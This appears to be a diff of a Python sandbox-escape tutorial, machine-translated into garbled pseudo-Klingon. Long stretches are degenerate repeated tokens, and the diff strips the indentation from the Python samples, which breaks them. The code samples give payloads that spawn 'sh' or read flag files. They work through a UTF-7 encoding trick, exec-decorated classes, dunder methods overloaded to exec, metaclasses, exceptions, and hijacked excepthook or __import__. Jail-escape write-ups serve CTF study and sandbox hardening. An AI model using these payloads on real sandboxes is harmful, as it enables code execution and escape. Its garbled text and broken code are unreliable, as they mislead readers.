(UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)
 ```python
 assert b"+AAo-".decode("utf_7") == "\n"
 
 payload = """
 # -*- coding: utf_7 -*-
 def f(x):
-    return x
-    #+AAo-print(open("/flag.txt").read())
+return x
+#+AAo-print(open("/flag.txt").read())
 """.lstrip()
 ```
+**ghItlhvam** vItlhutlh **encodings** **bypass** **luq** **'ej** `raw_unicode_escape` **'ej** `unicode_escape`.
 
-It is also possible to bypass it using other encodings, e.g. `raw_unicode_escape` and `unicode_escape`.
+## **Python** **execution** **jatlh** **ghItlhvam** **jail** **'ej** **jatlh** **'e'** **jatlh** **luq** **'ej** **code** **'ej** **commands** **'ej** **execute** **arbitrary functions**.
 
-## Python execution without calls
-
-If you are inside a python jail that **doesn't allow you to make calls**, there are still some ways to **execute arbitrary functions, code** and **commands**.
-
-### RCE with [decorators](https://docs.python.org/3/glossary.html#term-decorator)
-
+### RCE **[decorators](https://docs.python.org/3/glossary.html#term-decorator)** **vItlhutlh**
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 @exec
 @input
 class X:
-    pass
+pass
 
 # The previous code is equivalent to:
 class X:
-    pass
+pass
 X = input(X)
 X = exec(X)
 
@@ -213,7 +247,6 @@ X = exec(X)
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
-
 ### RCE creating objects and overloading
 
 If you can **declare a class** and **create an object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.
@@ -222,17 +255,24 @@ If you can **declare a class** and **create an object** of that class you could 
 
 You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.
 
+### RCE creating objects and overloading
+
+If you can **declare a class** and **create an object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.
+
+#### RCE with custom classes
+
+You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.
 ```python
 # This class has 3 different ways to trigger RCE without directly calling any function
 class RCE:
-    def __init__(self):
-        self += "print('Hello from __init__ + __iadd__')"
-    __iadd__ = exec #Triggered when object is created
-    def __del__(self):
-        self -= "print('Hello from __del__ + __isub__')"
-    __isub__ = exec #Triggered when object is created
-    __getitem__ = exec #Trigerred with obj[<argument>]
-    __add__ = exec #Triggered with obj + <argument>
+def __init__(self):
+self += "print('Hello from __init__ + __iadd__')"
+__iadd__ = exec #Triggered when object is created
+def __del__(self):
+self -= "print('Hello from __del__ + __isub__')"
+__isub__ = exec #Triggered when object is created
+__getitem__ = exec #Trigerred with obj[<argument>]
+__add__ = exec #Triggered with obj + <argument>
 
 # These lines abuse directly the previous class to get RCE
 rce = RCE() #Later we will see how to create objects without calling the constructor
@@ -271,114 +311,118 @@ __iand__ (k = 'import os; os.system("sh")')
 __ior__ (k |= 'import os; os.system("sh")')
 __ixor__ (k ^= 'import os; os.system("sh")')
 ```
+#### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses) vItlhutlh
 
-#### Crating objects with [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
-
-The key thing that metaclasses allow us to do is **make an instance of a class, without calling the constructor** directly, by creating a new class with the target class as a metaclass.
-
+**metaclasses** vItlhutlh **ghItlhvam** **ghItlhvam**, **constructor** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhv
 ```python
 # Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
 # This will define the members of the "subclass"
 class Metaclass(type):
-    __getitem__ = exec # So Sub[string] will execute exec(string)
+__getitem__ = exec # So Sub[string] will execute exec(string)
 # Note: Metaclass.__class__ == type
-    
+
 class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
-    pass # Nothing special to do
+pass # Nothing special to do
 
 Sub['import os; os.system("sh")']
 
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-
 #### Creating objects with exceptions
 
-When an **exception is triggered** an object of the **Exception** is **created** without you needing to call the constructor directly (a trick from [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
-
+**QaStaHvIS** **ghItlh** **exception** **trigger** **vItlhutlh** **Exception** **ghItlh** **object** **tlhutlh** **constructor** **cha'logh** **ghItlh** **vItlhutlh** (a trick from [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
 ```python
 class RCE(Exception):
-    def __init__(self):
-        self += 'import os; os.system("sh")'
-    __iadd__ = exec #Triggered when object is created
+def __init__(self):
+self += 'import os; os.system("sh")'
+__iadd__ = exec #Triggered when object is created
 raise RCE #Generate RCE object
 
 
 # RCE with __add__ overloading and try/except + raise generated object
 class Klecko(Exception):
-  __add__ = exec
+__add__ = exec
 
 try:
-  raise Klecko
+raise Klecko
 except Klecko as k:
-  k + 'import os; os.system("sh")' #RCE abusing __add__
-  
+k + 'import os; os.system("sh")' #RCE abusing __add__
+
 ## You can also use the tricks from the previous section to get RCE with this object
 ```
-
 ### More RCE
 
+### **QaHvIS RCE**
+
+#### **QaHvIS RCE** (Remote Code Execution) is a technique used to execute arbitrary code on a remote system. It allows an attacker to gain unauthorized access and control over the target system.
+
+#### **QaHvIS RCE** can be achieved through various vulnerabilities, such as:
+
+- **Command Injection**: This occurs when an attacker is able to inject malicious commands into a vulnerable application, which are then executed by the system.
+
+- **Code Injection**: This involves injecting malicious code into a vulnerable application, which is then executed by the system.
+
+- **File Inclusion**: This occurs when an attacker is able to include and execute arbitrary files on a vulnerable system.
+
+- **Deserialization**: This involves exploiting vulnerabilities in the deserialization process to execute arbitrary code.
+
+#### **QaHvIS RCE** can have severe consequences, as it allows an attacker to gain complete control over the target system. This can lead to data theft, unauthorized access, and further exploitation of the compromised system.
+
+#### To protect against **QaHvIS RCE**, it is important to:
+
+- Keep all software and applications up to date with the latest security patches.
+
+- Implement proper input validation and sanitization techniques to prevent command and code injection.
+
+- Use secure coding practices to minimize the risk of vulnerabilities.
+
+- Regularly perform security assessments and penetration testing to identify and address any potential vulnerabilities.
+
+#### **QaHvIS RCE** is a powerful technique that requires careful consideration and mitigation to ensure the security of systems and data.
 ```python
 # From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
 # If sys is imported, you can sys.excepthook and trigger it by triggering an error
 class X:
-    def __init__(self, a, b, c):
-        self += "os.system('sh')"
-    __iadd__ = exec
+def __init__(self, a, b, c):
+self += "os.system('sh')"
+__iadd__ = exec
 sys.excepthook = X
 1/0 #Trigger it
 
 # From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
-# The interpreter will try to import an apt-specific module to potentially 
+# The interpreter will try to import an apt-specific module to potentially
 # report an error in ubuntu-provided modules.
 # Therefore the __import__ functions are overwritten with our RCE
 class X():
-  def __init__(self, a, b, c, d, e):
-    self += "print(open('flag').read())"
-  __iadd__ = eval
+def __init__(self, a, b, c, d, e):
+self += "print(open('flag').read())"
+__iadd__ = eval
 __builtins__.__import__ = X
 {}[1337]
 ```
+### qarDaS builtins veDDaq & license
 
-### Read file with builtins help & license
+#### qarDaS builtins veDDaq
 
+`builtins` qarDaS jatlhlaHbe'chugh, 'ej qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS jatlhlaHbe'chugh 'e' vItlhutlh. 'e' vItlhutlh qarDaS 